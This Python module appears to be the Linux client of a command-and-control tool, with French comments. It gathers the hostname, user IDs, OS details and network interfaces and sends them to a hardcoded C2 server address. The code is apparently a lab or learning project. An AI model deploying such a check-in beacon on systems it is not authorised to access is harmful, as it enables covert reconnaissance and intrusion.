
import json
import socket
import subprocess

from src.c2.protocol import encode_message, decode_message
from src.lin.system_info import get_system_info, get_users_info


SERVER_HOST = "192.168.1.198"
SERVER_PORT = 5000


def get_network_interfaces():
    """Récupère les adresses IPv4 des interfaces réseau."""

    try:
        result = subprocess.run(
            ["ip", "-j", "-4", "addr", "show"],
            capture_output=True,
            text=True,
            check=True,
            timeout=5
        )

        interfaces = json.loads(result.stdout)
        network_info = []

        for interface in interfaces:

            # Ignore l'interface localhost
            if interface.get("ifname") == "lo":
                continue

            for address in interface.get("addr_info", []):

                if address.get("family") == "inet":
                    network_info.append({
                        "interface": interface.get("ifname"),
                        "ip": address.get("local"),
                        "prefix": address.get("prefixlen")
                    })

        return network_info

    except (
        OSError,
        subprocess.SubprocessError,
        json.JSONDecodeError
    ) as error:
        print(f"[-] Erreur de récupération réseau : {error}")
        return []


def create_client_message():
    """Prépare les informations système envoyées au serveur."""

    system_info = get_system_info()
    users = get_users_info()

    # Recherche les informations du compte actuellement utilisé
    current_user = next(
        (
            user for user in users
            if user["username"] == system_info["username"]
        ),
        None
    )

    if current_user:
        user_info = {
            "username": current_user["username"],
            "uid": current_user["uid"],
            "gid": current_user["gid"]
        }
    else:
        user_info = {
            "username": system_info["username"]
        }

    return {
        "type": "hello",
        "hostname": system_info["hostname"],
        "username": system_info["username"],
        "system": system_info["system"],
        "distribution": system_info["distribution"],
        "architecture": system_info["architecture"],
        "user_info": user_info,
        "interfaces": get_network_interfaces()
    }


def connect_to_server():
    """Envoie les informations Linux au serveur Windows."""

    message = create_client_message()

    try:
        with socket.create_connection(
            (SERVER_HOST, SERVER_PORT),
            timeout=5
        ) as client_socket:

            print("[+] Connexion au serveur réussie")

            client_socket.sendall(encode_message(message))

            with client_socket.makefile("rb") as server_file:
                response_data = server_file.readline()

            if not response_data:
                print("[-] Le serveur a fermé la connexion.")
                return

            response = decode_message(response_data)

            print("[+] Réponse du serveur :", response)

    except (OSError, ValueError) as error:
        print(f"[-] Erreur de communication : {error}")


if __name__ == "__main__":
    connect_to_server()
